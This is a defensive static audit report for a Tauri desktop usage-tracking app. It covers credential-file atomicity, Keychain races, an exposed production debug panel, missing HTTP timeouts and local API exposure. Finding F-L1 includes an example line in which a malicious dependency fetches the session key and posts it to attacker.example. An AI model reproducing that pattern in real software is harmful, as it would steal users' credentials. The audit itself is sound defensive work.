# UsageWatch Security & Bug Audit Report

**Scope:** Read-only static analysis of UsageWatch Tauri 2 desktop app (Rust backend + React/TypeScript webview + MCP server). Covers credential handling, IPC surface, file write atomicity, polling correctness, widget behavior, and performance. Does NOT cover runtime dynamic analysis, fuzzing, or network interception.

---

## Audit Plan

**Detected stack:** Tauri 2.x (Rust backend via `src-tauri/`), React + TypeScript webview (`src/`), Vite multi-page build (`index.html` + `widget/`), `tauri-plugin-store` for persistence (`credentials.json`), `tauri-plugin-sql` (SQLite), `tauri-plugin-autostart`, `reqwest` HTTP clients, `rdev` + `NSGlobalMonitor` for mouse tracking, `rookie` for browser cookie decryption, macOS Keychain via `security` subprocess, local MCP server (`mcp-server/`).

**Territories covered:**

| Path | What was examined |
|---|---|
| `src-tauri/src/commands/credentials.rs` | Store writes, key exposure over IPC |
| `src-tauri/src/commands/usage.rs` | API fetch, debug commands, raw-response exposure |
| `src-tauri/src/commands/browser.rs` | Cookie scanning, temp file lifecycle, BrowserResult serialization |
| `src-tauri/src/commands/codex.rs` | OAuth refresh, Keychain write, file write atomicity, retry loop |
| `src-tauri/src/commands/cursor.rs` | Auth discovery, billing-cycle date logic, token IPC exposure |
| `src-tauri/src/commands/claude_oauth.rs` | OAuth refresh, Keychain write, file write atomicity, expiry logic |
| `src-tauri/src/commands/mcp.rs` | Bulk enable/disable, backup collision, debug host content |
| `src-tauri/src/polling.rs` | Poll loop concurrency, join! stall, timeout absence |
| `src-tauri/src/http_server.rs` | CORS, Host validation, unauthenticated surface |
| `src-tauri/src/hook.rs` / `native_tray.m` | Mouse event volume, AX polling, rdev lifecycle |
| `src-tauri/src/credentials_cache.rs` | Multi-mutex TOCTOU |
| `src/` (App, Popover, AppContext, ProviderMethodPicker, Settings, Settings2, DebugPanel, WidgetOverlay) | IPC usage, state management, error display, autostart, widget drag |
| `docs/widget-click-through-drag.md` | Implementation vs. spec gap |
| `mcp-server/` | MCP server surface (noted; no separate findings generated) |

---

## Executive Summary

**Findings by severity:**

| Severity | Count |
|---|---|
| Critical | 1 |
| High | 5 |
| Medium | 4 |
| Low | 30 |

**Top 5 to fix first:**

1. **[Critical]** Non-atomic `tokio::fs::write` to `~/.codex/auth.json` corrupts Codex CLI credentials on crash — `src-tauri/src/commands/codex.rs:209`
2. **[High]** Non-atomic `delete` + `add` to macOS Keychain for Claude Code credentials permanently deletes the item if killed between two `security` subprocess calls — `src-tauri/src/commands/claude_oauth.rs:100-112`
3. **[High]** Non-atomic `delete` + `add` to macOS Keychain for Codex credentials — `src-tauri/src/commands/codex.rs:85-95`
4. **[High]** Debug panel fully accessible in production builds, exposing live API calls (raw billing responses, Cursor email, org ID) with no `IS_DEV` guard — `src/components/settings/sections/DebugSection.tsx:1-9`, `src-tauri/src/lib.rs:132-157`
5. **[High]** No request timeout on any main provider HTTP client; a single half-open TCP connection stalls the entire `tokio::join!` poll, silently freezing all three provider displays — `src-tauri/src/polling.rs:180`, `src-tauri/src/commands/usage.rs:59,96,117`, `src-tauri/src/commands/codex.rs:137,172,270`, `src-tauri/src/commands/cursor.rs:810`

---

## Findings

### Critical

---

#### F-C1: Non-atomic write to `~/.codex/auth.json` corrupts Codex CLI credentials on crash

**Severity:** Critical | **Confidence:** High
**Locations:** `src-tauri/src/commands/codex.rs:207-211`

**Scenario:** `persist_auth_record()` calls `tokio::fs::write(path, updated)` which truncates the target file before writing. If the process is killed (SIGKILL, OOM kill, power loss, force-quit) between truncation and write completion, `~/.codex/auth.json` is left empty or partially written. The Codex CLI reads this file on startup and will fail to authenticate. The refresh path fires whenever `last_refresh >= 8` days old (lines 242-244) or on a 401 from the usage endpoint (lines 293-311); in steady state the 401-triggered path fires on nearly every poll cycle because access tokens expire in hours, not 8 days. Combined with the unbounded retry loop (F-M2), the write window is open frequently.

**Impact:** Codex CLI loses credentials silently; user must re-run `codex auth`. Cross-app data loss of another tool's credential file — the definition of critical per the audit rubric.

**Fix sketch:** Write to `~/.codex/auth.json.tmp` in the same directory, then call `tokio::fs::rename` to atomically replace the target. Use `tempfile::NamedTempFile::persist()` for a crate-based equivalent.

---

### High

---

#### F-H1: Non-atomic Keychain delete+add for Claude Code credentials — item permanently lost if killed mid-operation

**Severity:** High | **Confidence:** Medium (window is millisecond-narrow but repeats on every refresh cycle)
**Locations:** `src-tauri/src/commands/claude_oauth.rs:100-112`

**Scenario:** `write_oauth_to_keychain()` calls `security delete-generic-password -s 'Claude Code-credentials'` (line 101), then `security add-generic-password ...` (line 105) as two independent subprocess invocations. If the process is killed — macOS OOM kill, user force-quitting, or a crash — after the delete but before the add completes, the Keychain item is permanently gone. On macOS, the file-based fallback path (`~/.claude/.credentials.json`) is skipped entirely (lines 251-257 write to Keychain only on macOS). The item is not recoverable without re-running `claude` in a terminal. The operation repeats on every poll tick when the token is within 5 minutes of expiry.

**Impact:** Claude Code CLI permanently loses its Keychain credentials and requires manual re-authentication via the CLI. Cross-app credential loss of another tool.

**Fix sketch:** Replace the delete+add sequence with `security add-generic-password -U ...` (upsert flag), which atomically creates-or-replaces the item in a single syscall, eliminating the window.

---

#### F-H2: Non-atomic Keychain delete+add for Codex credentials — same pattern

**Severity:** High | **Confidence:** High
**Locations:** `src-tauri/src/commands/codex.rs:85-95`

**Scenario:** `write_auth_to_keychain()` deletes the `Codex Auth` Keychain item (line 86), then adds the new one (line 89), as two separate `security` subprocess calls. A kill between the two steps permanently removes the Keychain item with no file-path fallback (this code path is taken only when `record.path.is_none()`, meaning Keychain was the only storage). The refresh fires whenever `last_refresh >= 8` days old or on a 401. Combined with F-C1, the non-atomic file write and non-atomic Keychain write affect the same credentials on every real poll cycle.

**Impact:** Codex CLI loses its Keychain credentials; user must re-run `codex auth`. Cross-app credential loss.

**Fix sketch:** Use `security add-generic-password -U` for an atomic upsert. This closes the window entirely.

---

#### F-H3: Non-atomic write to `~/.claude/.credentials.json` corrupts Claude Code auth on crash (Windows/Linux)

**Severity:** High | **Confidence:** High
**Locations:** `src-tauri/src/commands/claude_oauth.rs:260-264`

**Scenario:** Under `#[cfg(not(target_os = "macos"))]`, after a successful OAuth refresh, the code calls `std::fs::write(&path, json)` which truncates the file, then writes. If the process is killed between truncation and write completion, `~/.claude/.credentials.json` is left empty. Claude Code CLI reads this file on every invocation. macOS is unaffected (uses Keychain path). Windows and Linux builds are affected. The refresh fires in the background at each poll tick when the token is near expiry.

**Impact:** Claude Code CLI becomes unauthenticated on Windows/Linux; user must re-authenticate from scratch. Cross-app data loss.

**Fix sketch:** Write to `.credentials.json.tmp` (same directory), then `std::fs::rename` over the target — atomic on POSIX, best-effort atomic on NTFS same-volume. Matches the correct pattern that should be used for F-C1 as well.

---

#### F-H4: Debug panel is fully accessible in production builds — exposes raw billing API responses, Cursor email, and org ID

**Severity:** High | **Confidence:** High
**Locations:** `src/components/settings/sections/DebugSection.tsx:1-9`, `src/components/settings/Settings2.tsx:91`, `src/components/settings/SettingsSidebar.tsx:19`, `src/components/DebugPanel.tsx:22-46`, `src-tauri/src/lib.rs:132-157`

**Scenario:** The production entrypoint `App.tsx:7` imports and renders `Settings2`, not the old `Settings.tsx`. `Settings.tsx` correctly gates the Debug tab behind `IS_DEV = import.meta.env.DEV` (line 85, 1218). `Settings2.tsx:91` renders `<DebugSection />` whenever `active === 'debug'` with no `IS_DEV` guard. `SettingsSidebar.tsx:27-46` renders the Debug button unconditionally; `debug: true` only adds a CSS dim class, it does not gate click handling. A production user who clicks the dimmed 🐛 icon lands on `DebugSection`, which renders `DebugPanel` unconditionally. From there they can invoke:

- `fetch_usage_raw` (lib.rs:132): passes session key + org ID from the webview to a live claude.ai request, returns raw response body
- `debug_claude_api_raw` (lib.rs:134): makes 5 live API calls (usage, billing, prepaid, bundles, overage), returns full `raw_body` strings including financial data
- `debug_cursor_api` (lib.rs:157): resolves Cursor bearer, makes 9+ live calls, returns structured diagnostics including `email_from_desktop_storage`
- `debug_claude_desktop_cookies` (lib.rs:145)

All four Tauri commands are registered unconditionally in `lib.rs` with no `#[cfg(debug_assertions)]` guard.

**Impact:** Production users can trigger authenticated live API requests and see raw billing/usage/email data through an unintended UI path. Data surfaced in `<pre>` elements can be shared in screenshots or bug reports, inadvertently disclosing account-sensitive billing details. The debug commands remain callable via IPC even with the UI gated, leaving dead attack surface in production.

**Fix sketch:** Add `if (!import.meta.env.DEV) return null;` at the top of `DebugSection.tsx`, or add `{import.meta.env.DEV && active === 'debug' && <DebugSection />}` in `Settings2.tsx:91`. Also add `#[cfg(debug_assertions)]` to all four Rust command registrations in `lib.rs:132-157`.

---

#### F-H5: No request timeout on any main provider HTTP client — single stalled TCP connection freezes entire poll loop

**Severity:** High (downgraded from finding's original; medium per some verifier notes — but the "silent wrong-usage near limit" scenario justifies high given the audit rubric)
**Confidence:** High
**Locations:** `src-tauri/src/polling.rs:180,206`, `src-tauri/src/commands/usage.rs:59,96,117,195,453`, `src-tauri/src/commands/codex.rs:137,172,270,359,435`, `src-tauri/src/commands/cursor.rs:810,1194,1377`

**Scenario:** Every `reqwest::Client::new()` in the main poll path (Claude, Codex, Cursor, billing) is created without `.timeout(...)`. The only exception is `fetch_peak_hours` (`usage.rs:514`, 5 s timeout). `poll_all_providers` at `polling.rs:180` uses `tokio::join!` to await Claude, Codex, Cursor, and billing concurrently. If any single connection enters a half-open TCP state (SYN-ACK received, then server stops sending — common after network transitions, sleep/wake, or VPN reconnect), the OS will not reset it for 20–40 minutes on macOS by default. `tokio::join!` waits for ALL branches, so one stalled connection silently freezes the entire poll: no `usage-update`, `codex-update`, or `cursor-update` events are emitted. The tray and popover show last-known data with no error indicator (see also F-M3). The user cannot distinguish a stall from a quiet period, and may believe their usage is stable when it has actually changed.

**Impact:** All three provider displays go stale with no user-visible error for up to 20+ minutes. Near a usage limit boundary, the user sees a stale safe value while actual usage may have crossed the limit.

**Fix sketch:** Add `.timeout(Duration::from_secs(30))` when building each `reqwest::Client` in the poll path, or wrap each provider future in `tokio::time::timeout(Duration::from_secs(30), ...)` inside `poll_all_providers`.

---

### Medium

---

#### F-M1: Polling failure with existing stale data shows no error indicator — silent display of potentially maxed limit

**Severity:** Medium | **Confidence:** High
**Locations:** `src/context/AppContext.tsx:91-97`, `src/components/Popover.tsx:221`, `src/hooks/useUsageData.ts:12-18`

**Scenario:** `SET_ERROR` (AppContext.tsx:91) sets `state.error` and `state.lastUpdated` but does NOT clear `state.usageData`. The error banner in `Popover.tsx:221` is gated on `error && !usageData` — once `usageData` is populated from any prior successful poll, this condition is permanently false. A session key expiry or API auth failure emits `SET_ERROR` via `useUsageData.ts:12-18`, but the user continues seeing the last-known usage percentages with the "Last updated" timestamp appearing fresh (it's updated by both `SET_USAGE` and `SET_ERROR`). The alert engine (useAlertEngine.ts:44) guards on `if (!usageData) return`, so it continues processing stale data with `sessionAlertFired` still true — suppressing re-alerts when the actual state is unknown. The offline banner (lines 215-219) only handles `navigator.onLine`, not API-level auth errors.

**Impact:** User sees outdated usage (e.g. 45% when actual may be 100%) with no visible indication of failure. Masks a real limit crossing — the high-severity UX failure criterion in the audit rubric.

**Fix sketch:** Change the error banner condition to `{error && <div className="status-banner error">{error} (showing last known data)</div>}` (remove the `!usageData` guard); or add a staleness indicator when `lastUpdated` is more than 2× the poll interval in the past.

---

#### F-M2: Unbounded Codex retry loop — permanent stall of the entire poll if token refreshes succeed but usage endpoint keeps rejecting

**Severity:** Medium | **Confidence:** High
**Locations:** `src-tauri/src/commands/codex.rs:272-336`

**Scenario:** `fetch_codex_usage_internal` contains an unconditional `loop` (line 272). On a 401/403 from the usage endpoint, it calls `do_token_refresh`, reassigns `record = Some(refreshed_record)` at line 310, and `continue`s. If `auth.openai.com` keeps returning fresh tokens (the refresh succeeds) but `chatgpt.com/backend-api/wham/usage` keeps returning 401/403 (e.g. account suspended, API access revoked, or a server-side flag), the loop never terminates. There is no iteration counter or break condition other than a refresh failure or persist failure. Combined with F-H5 (no timeout), each loop iteration can itself stall. Since `poll_all_providers` uses `tokio::join!`, a stalled Codex future freezes Claude and Cursor data indefinitely.

**Impact:** The Codex fetch never returns; all provider displays freeze until the app is restarted. Requires a realistic but non-trivial trigger (account issue where OAuth still works but API usage is revoked).

**Fix sketch:** Add a retry counter before `continue`: `if retries >= 2 { return Err("Codex usage fetch failed after refresh".to_string()); } retries += 1;`. The existing error path handles the failure cleanly.

---

#### F-M3: Poll loop and manual refresh race on Claude OAuth can double-rotate the single-use refresh token

**Severity:** Medium | **Confidence:** Medium
**Locations:** `src-tauri/src/commands/claude_oauth.rs:194-269`, `src-tauri/src/polling.rs:180-185`, `src-tauri/src/lib.rs:646-664`

**Scenario:** `get_claude_oauth_token()` has no in-flight guard. Three independent code paths can invoke it concurrently: (1) background poll loop (`start_unified_polling` → `poll_all_providers`), (2) `refresh_all_providers` Tauri command (lib.rs:646), (3) tray Refresh menu item (lib.rs:272-282). The `REFRESH_FAILURE` static Mutex (line 13) is a backoff tracker only. If the user clicks Refresh while a background tick is in-flight and both find the token within the 5-minute expiry window, both tasks independently POST the same refresh token to the OAuth endpoint. If Anthropic uses single-rotation semantics (standard per RFC 6749), the second caller gets `invalid_grant`, triggers the 30-minute backoff (`REFRESH_FAILURE`), and UsageWatch stops polling via OAuth for 30 minutes. The first caller's written credentials are still valid; Claude Code itself is unaffected.

**Impact:** UsageWatch OAuth polling is disrupted for up to 30 minutes after a double-rotation; the user sees stale/error data during that window. Not a permanent credential loss.

**Fix sketch:** Introduce a `tokio::sync::Mutex<Option<JoinHandle<...>>>` or a `tokio::sync::OnceCell`-style in-flight guard so that a second concurrent caller waits for the first to complete and reuses the freshly written token.

---

#### F-M4: `mcp_set_enabled_bulk` partial-write leaves multi-host enable state inconsistent on any mid-loop I/O failure

**Severity:** Medium | **Confidence:** High
**Locations:** `src-tauri/src/commands/mcp.rs:1224-1234`

**Scenario:** The function loops over hosts and uses `?` on both `read_host_file_for` (line 1227) and `write_host_file` (line 1229). If the third of three target writes fails (disk-full, permission error), the first two writes are already committed and the function returns `Err`. No rollback is attempted. Individual writes are atomic (tmp+rename via `atomic_write_json`, lines 294-308), so partially-written single files are not a concern, but the across-hosts enable-state is left inconsistent. The `mcp_add_server` function (line 1247+) correctly collects per-outcome results and continues rather than early-returning, making the contrast clear. Recovery requires the user to manually locate and restore backups from the `mcp-backups` directory.

**Impact:** User's MCP server is enabled in some tools (e.g. Claude Desktop, Cursor) but not others (e.g. Claude Code) with no clear indication of which succeeded or failed. Manual recovery needed.

**Fix sketch:** Pre-validate all target paths before writing (collect all paths, check backup/read succeed), then write in a second pass; or collect failures into `WriteOutcome.note` (with `written: false`) and return a partial-failure report rather than early-`Err`, matching the pattern already used in `mcp_add_server`.

---

### Low

---

#### F-L1: Raw credentials returned to webview via IPC (get_session_key, get_codex_token, get_codex_browser_cookie, get_cursor_token)

**Severity:** Low (supply-chain threat; not a direct exploit) | **Confidence:** High
**Locations:** `src-tauri/src/commands/credentials.rs:77-79`, `src-tauri/src/commands/codex.rs:392-396,425-429`, `src-tauri/src/commands/cursor.rs:1413-1417`, `src-tauri/src/lib.rs:125,144,146,153`, `src-tauri/tauri.conf.json:49`

**Scenario:** All four getter commands return the full raw credential string to calling JS. The CSP (`connect-src self https:`) allows fetch() to any HTTPS endpoint from bundled JS. A compromised npm dependency bundled at build time could call `invoke('get_session_key')` then `fetch('https://attacker.example/', {body: key})`. Two call sites (App.tsx:19, Popover.tsx:52) only need a null-check; `ProviderMethodPicker.tsx:90,146` functionally requires the raw value to forward to `test_connection`.

**Impact:** Full credential exfiltration to an external server if any bundled dependency is malicious. Active tokens grant API access under the user's quota.

**Fix sketch:** Add boolean `check_session_key` / `check_codex_auth` commands for the null-check call sites and replace those callers; restrict `connect-src` to specific trusted domains rather than `https:`. The raw getter for `test_connection` may need a Rust-side `test_connection_from_store` command that reads credentials internally.

---

#### F-L2: `BrowserResult.debug` includes a 30-character prefix of the session key and is serialized to the webview

**Severity:** Low (additive; full key already present in same struct) | **Confidence:** High
**Locations:** `src-tauri/src/commands/browser.rs:194-235`, `src-tauri/src/models.rs:588-594`

**Scenario:** `pull_session_from_browsers()` populates `BrowserResult.debug` with `prefix=<first 30 chars of sessionKey>` for each found cookie (lines 198-205). `BrowserResult` derives `Serialize` without redaction and is returned over `scan_browsers` IPC. The full session key is already in `BrowserResult.session_key` — the debug prefix is purely redundant exposure that also surfaces in React DevTools heap snapshots.

**Fix sketch:** Remove the `prefix=...` line from the debug string; log only non-sensitive metadata (`len=`, `domain=`, `path=`).

---

#### F-L3: CORS only restricts browser-origin requests — any local process reads spend/billing/email unauthenticated; no Host header validation

**Severity:** Low | **Confidence:** High
**Locations:** `src-tauri/src/http_server.rs:39-54`, `src-tauri/src/models.rs:310-322,382-446`

**Scenario:** The `CorsLayer` only blocks cross-origin *browser* requests by checking the HTTP `Origin` header. Any local CLI, script, or process that omits the `Origin` header (e.g. `curl http://127.0.0.1:52700/api/cursor`) bypasses CORS entirely and receives the full `CursorUpdate` JSON including `email` (models.rs:429) and `connect_extras` (raw RPC blobs, models.rs:442). There is no `Host` header validation, enabling DNS-rebinding attacks (a browser page at `attacker.com` resolving to `127.0.0.1` can reach the endpoint if the `Origin` matches). Note: the data exposed is usage/billing metadata and email; session keys and OAuth tokens are NOT serialized into the HTTP API response structs.

**Fix sketch:** Add middleware to validate `Host` is exactly `127.0.0.1:52700` (reject `localhost` and all other values) to close the DNS-rebinding vector; optionally require a shared-secret token header for all routes.

---

#### F-L4: POST /api/open performs unauthenticated window focus-steal from any local process

**Severity:** Low | **Confidence:** High
**Locations:** `src-tauri/src/http_server.rs:52,107-117`

**Scenario:** Any local process can send `POST http://127.0.0.1:52700/api/open` with no credentials. The handler unconditionally calls `window.show()`, `window.set_focus()`, and emits `window-opened`. The DNS-rebinding vector is already mitigated by the CORS origin allowlist (lines 39-45). The residual risk is local processes causing unexpected focus-steal during presentations or screen recordings.

**Fix sketch:** Same Host-header validation as F-L3 closes the DNS-rebinding path; optionally require a per-session token header to block local-process abuse.

---

#### F-L5: Raw parse error including up to 500 bytes of API response body stored in `UsageUpdate.error` and served over HTTP API

**Severity:** Low | **Confidence:** High
**Locations:** `src-tauri/src/polling.rs:228`, `src-tauri/src/http_server.rs:73-77`

**Scenario:** When serde parsing fails on a 2xx response, the error is formatted as `"Failed to parse usage data: <serde error>. Raw: <first 500 bytes>"` (polling.rs:228) and stored in `UsageUpdate.error`, then served unauthenticated by GET `/api/usage`. Claude's API response bodies do not echo the session cookie back, so credential leakage is not realistically reachable, but the pattern of serving raw upstream API fragments unauthenticated is sloppy hygiene.

**Fix sketch:** In the polling path, log the raw fragment to stderr only (matching `commands/usage.rs`) and store only a sanitized error message (without the `Raw:` suffix) in `UsageUpdate.error`.

---

#### F-L6: `debug_claude_api` includes `org_id` value in its JSON output returned to the webview

**Severity:** Low | **Confidence:** High
**Locations:** `src-tauri/src/commands/usage.rs:205`, `src-tauri/src/lib.rs:133`

**Scenario:** `debug_claude_api_impl` always includes `"org_id": org_id` in its output regardless of the `include_raw` parameter. This is additional to the dedicated `get_org_id` IPC command (lib.rs:128) which also exposes it directly — so this adds no new attack surface. The value in the debug JSON output is redundant but not independently harmful.

**Fix sketch:** Replace `"org_id": org_id` with `"has_org_id": org_id.is_some()` in the debug output; the existing boolean is already sufficient for diagnostics.

---

#### F-L7: `mcp_debug_host` returns full raw config file content (including env API keys) to the webview; has no frontend callers

**Severity:** Low | **Confidence:** High
**Locations:** `src-tauri/src/commands/mcp.rs:1448-1449`, `src-tauri/src/lib.rs:194`

**Scenario:** `mcp_debug_host` reads the entire on-disk MCP config (Claude Desktop, Claude Code, Cursor, Codex) and returns it as `{ path, exists, content }`. MCP server configs commonly contain `env` blocks with `ANTHROPIC_API_KEY`, `OPENAI_API_KEY`, database credentials, etc. The command is registered unconditionally in lib.rs:194 but has zero frontend callers (no call to `mcp_debug_host` or `mcpDebugHost` anywhere in `src/` or `mcp-server/`). It is dead IPC surface.

**Fix sketch:** Remove the command from `lib.rs` and `mcp.rs` entirely (it has no callers). If retained for debugging, strip `env` and `headers` values from the returned content, and add `#[cfg(debug_assertions)]`.

---

#### F-L8: `credentials.json` written without explicit 0600 permissions — readable by other local users on Linux

**Severity:** Low | **Confidence:** Medium
**Locations:** `src-tauri/src/commands/credentials.rs:7-13`

**Scenario:** `tauri-plugin-store` writes `credentials.json` with umask-derived permissions (typically 0644). On macOS, the parent `~/Library/Application Support/` is 0700, so other OS users cannot traverse into it. On Linux, if `~/.local/share/<app>/` is world-executable (some distro defaults), a 0644 file is readable by any local user. Stored credentials include `session_key`, `codex_manual_token`, `cursor_manual_token`.

**Fix sketch:** After each `store.save()`, explicitly `std::fs::set_permissions(path, Permissions::from_mode(0o600))` on Unix; or set `umask(0o077)` before Tauri store initialization.

---

#### F-L9: Windows temp cookie DB uses a hardcoded filename — race-condition data corruption and cleanup gap on panic

**Severity:** Low | **Confidence:** High (two sub-issues merged)
**Locations:** `src-tauri/src/commands/browser.rs:34,53,42,56`

**Sub-issue A — shared filename collision:** Both `read_electron_cookie_windows()` (ChatGPT Desktop) and `read_electron_cookie_header_windows()` (Claude Desktop) write to the same fixed path `usagewatch_electron_cookies_tmp.db`. If two concurrent `scan_browsers` IPC calls run simultaneously (one for Claude, one for Codex), the second write can overwrite the temp file while the first `rookie::chromium_based()` call is still reading it, silently returning no credential for one provider. Within a single `scan_browsers` call the two functions run sequentially so there is no race.

**Sub-issue B — cleanup gap on panic:** `remove_file()` (lines 42, 56) is placed after the `rookie` call. If `rookie` panics on a malformed cookie DB, the cleanup is skipped. The temp file (encrypted DB copy, not decrypted content) lingers in `%TEMP%` — no additional exposure over the original source file which the same user already has access to.

**Fix sketch:** Use `tempfile::NamedTempFile` per invocation (unique path, auto-deleted on drop) to fix both issues simultaneously.

---

#### F-L10: `is_expiring_soon(0)` always returns true when `expires_at` defaults to 0 — unnecessary refresh on first poll with older credentials format

**Severity:** Low | **Confidence:** High
**Locations:** `src-tauri/src/commands/claude_oauth.rs:141-148,24-36`

**Scenario:** `ClaudeAiOauth.expires_at` has `#[serde(default)]` and defaults to `u64` zero. `is_expiring_soon(0)` evaluates `0 <= now_ms + 300_000`, which is always true. A user whose credentials file was written by an older Claude Code version that omitted `expiresAt` will trigger the refresh path on the first poll. If the refresh token is still valid, the call succeeds and self-heals after a single extra request. The 30-minute backoff at lines 213-222 prevents any refresh storm if the token is already expired.

**Fix sketch:** Treat `expires_at == 0` as "unknown expiry — use token as-is" and return `false` from `is_expiring_soon`; only trigger refresh when `expires_at > 0` and genuinely near expiry.

---

#### F-L11: Codex proactive refresh uses 8-day age threshold, not token expiry — reactive 401 path fires on nearly every poll in steady state

**Severity:** Low | **Confidence:** High
**Locations:** `src-tauri/src/commands/codex.rs:235-244`

**Scenario:** The proactive refresh at lines 235-244 fires only when `last_refresh >= 8` days. OpenAI/ChatGPT access tokens typically expire in under 24 hours. `RefreshResponse` (lines 32-38) does not capture `expires_in`. In steady state, every poll cycle hits the reactive 401-triggered path (lines 293-311) which correctly handles the refresh. The proactive path is effectively dead code in normal operation. The app produces correct results, but the redundant 401 round-trip per cycle compounds the non-atomic write risk (F-C1).

**Fix sketch:** Capture and persist `expires_in` from the refresh response; proactively refresh when the token is within 5 minutes of expiry, mirroring the Claude OAuth pattern.

---

#### F-L12: Poll loop and Codex manual refresh race — transient one-cycle fetch error on concurrent double-rotation

**Severity:** Low | **Confidence:** High
**Locations:** `src-tauri/src/commands/codex.rs:246-263,293-311`, `src-tauri/src/polling.rs:180-185`, `src-tauri/src/lib.rs:646-664`

**Scenario:** Same structural race as F-M3 but for Codex. The poll loop fully awaits `poll_all_providers` before the next tick, so overlap only occurs if the user clicks Refresh during an in-flight scheduled poll. If both callers post the same refresh token, the second call fails with a provider error; the first caller's write of valid new tokens already completed. Impact is a transient one-cycle fetch error, not permanent credential invalidation.

**Fix sketch:** Shared `tokio::sync::Mutex` over the refresh-and-persist path in `resolve_codex_auth` and the inline 401 handler, matching the recommendation for F-M3.

---

#### F-L13: Cursor billing-cycle end date silently drops to `None` when cycle ends exactly at poll time

**Severity:** Low | **Confidence:** Medium
**Locations:** `src-tauri/src/commands/cursor.rs:539-545`

**Scenario:** `select_cursor_cycle_dates` filters candidate end datetimes with `filter(|dt| *dt > now)`. If the billing cycle ends at exactly the polled timestamp (rare due to nanosecond precision), the end date is dropped; `cycle_resets_at` becomes `None` for one tick. Self-corrects on the next poll. Note: using `>= now` as a fix would incorrectly retain an already-expired date; a small negative grace window is more defensible.

**Fix sketch:** Apply a 5-second grace window: `filter(|dt| *dt > now - Duration::seconds(5))` to handle boundary timing without retaining stale dates.

---

#### F-L14: Backup filename collision for two same-named project directories modified within the same second

**Severity:** Low | **Confidence:** Medium
**Locations:** `src-tauri/src/commands/mcp.rs:273-285`

**Scenario:** `ensure_backup` generates backup filename using only `p.file_name()` (last path component) and a one-second-precision timestamp. Two distinct projects at `/work/alpha/myproject` and `/home/foo/myproject` modified within the same UTC second produce identical filenames; `fs::copy` silently overwrites the first backup. The first project's pre-edit backup is unrecoverable if needed.

**Fix sketch:** Append a short hash of the source path (first 8 chars of SHA-256 of the full path) to the backup filename: `{host}-{scope_tag}-{src_hash_prefix}-{ts}.{ext}`.

---

#### F-L15: `selectClaudeOrg` called from `onChange` with no error handling — silent partial credential write if `save_org_id` fails

**Severity:** Low | **Confidence:** High
**Locations:** `src/components/setup/ProviderMethodPicker.tsx:315-334,483`

**Scenario:** `finishClaudeSetup` (line 315) sequentially `await invoke('save_session_key')` then `await invoke('save_org_id')` with no try/catch. If the first succeeds and the second fails (disk-full, store error), `credentials.json` has `session_key` but no `org_id`. The unhandled rejection propagates silently; the UI shows no error. On next launch, `checkCredentials` (App.tsx:21) finds `sessionKey && !orgId` → `hasCredentials: false` and prompts re-setup.

**Fix sketch:** Wrap the `onChange` call: `onChange={async (e) => { try { await selectClaudeOrg(e.target.value); } catch (err) { setStatus(activeMethod ?? 'manual', 'error', String(err)); } }}`. Also add rollback in `finishClaudeSetup` (delete `session_key` if `save_org_id` throws).

---

#### F-L16: `mcp_add_server` drops partial outcomes and returns a generic error string when any single host write fails

**Severity:** Low | **Confidence:** High
**Locations:** `src-tauri/src/commands/mcp.rs:1278-1281,1252-1293`

**Scenario:** `?` inside the loop causes early return on any I/O failure, discarding the `outcomes` Vec. The caller (useMcpManager.ts:116) receives only an error string with no visibility into which targets already succeeded. Re-running the operation is safe (idempotent) but the user is left confused about partial state.

**Fix sketch:** Collect failures into `WriteOutcome.note` (with `written: false`) rather than early-returning, matching the pattern already used for path-resolution failures earlier in the same loop.

---

#### F-L17: Autostart toggle in `Settings2/GeneralSection` updates React state only — never calls the autostart plugin API and does not persist

**Severity:** Low | **Confidence:** High
**Locations:** `src/components/settings/sections/GeneralSection.tsx:60-67`, `src/components/Settings.tsx:1181-1187`

**Scenario:** The 'Launch at login' toggle dispatches `UPDATE_SETTINGS` to React state only. No `invoke()` call or `@tauri-apps/plugin-autostart` JS API is called. `defaultSettings.autostart: false` (AppContext.tsx:52) and no load path reads the stored value back, so state resets on every launch. Toggling it on has zero effect.

**Fix sketch:** Import `{ enable, disable, isEnabled }` from `@tauri-apps/plugin-autostart` and call them in the toggle handler and on component mount.

---

#### F-L18: Widget `dragRef` not cleared on window `blur` — widget becomes fully opaque to mouse input after interrupted drag

**Severity:** Low | **Confidence:** High
**Locations:** `src/widget/WidgetOverlay.tsx:376-387`, `docs/widget-click-through-drag.md:285-293`

**Scenario:** The documented implementation requires `window.addEventListener('blur', stopDragging)`. The actual code at lines 381-385 registers only `pointerup` and `mouseup`. If a system modal intercepts the pointer-release during a header drag (macOS permission dialog, sleep/wake), `dragRef.current` stays `true` permanently. The `device-mouse-move` handler then evaluates `shouldIgnore = false` for every subsequent event regardless of cursor position, causing the widget to absorb all clicks in its bounding box until app restart or a successful new drag/release.

**Fix sketch:** Add `window.addEventListener('blur', stopDragging)` in the same `useEffect` block as `pointerup`/`mouseup` (WidgetOverlay.tsx:381), with corresponding `removeEventListener` in the cleanup return.

---

#### F-L19: `device-mouse-move` IPC emitted on every global mouse move with no throttle or dedup guard

**Severity:** Low | **Confidence:** High
**Locations:** `src-tauri/src/hook.rs:28-38`, `src-tauri/src/native_tray.m:352-373`, `src/widget/WidgetOverlay.tsx:363-374`

**Scenario:** On macOS, `NSGlobalMonitorForEventsMatchingMask` fires on every mouse move system-wide; `emit_mouse` (hook.rs:28) is called unconditionally on every event, emitting `device-mouse-move` even when coordinates are outside the ±80-px guard zone (emitting the `{x:-9999,y:-9999}` sentinel rather than skipping). The JS handler at WidgetOverlay.tsx:366 does short-circuit on `ignoreStateRef.current === shouldIgnore`, avoiding the expensive `setIgnoreCursorEvents` IPC call on most events. The main overhead is the Rust→JS IPC serialization on every mouse-move event.

**Fix sketch:** Track last emitted coordinates in `AtomicI32` pairs in `hook.rs`; skip `emitter.emit` if coordinates are unchanged AND outside the widget bounding box. Alternatively throttle to one event per 16 ms in the Rust layer.

---

#### F-L20: macOS AX window-title polling runs synchronous blocking calls on the main run-loop thread with no timeout

**Severity:** Low (opt-in feature) | **Confidence:** High
**Locations:** `src-tauri/src/native_tray.m:547-570,581-595`

**Scenario:** When `title_matching_enabled` is true, an `NSTimer` (0.5 s repeat) fires `ax_frontmost_window_title()` on the main run loop. Two `AXUIElementCopyAttributeValue` calls (lines 559, 564) have no `AXUIElementSetMessagingTimeout` set. If the frontmost app is unresponsive (beachball), AX can stall up to ~2 s, blocking tray redraws and click responses during each tick. `title_matching_enabled` defaults to `false`, so this only affects users who explicitly enable title matching.

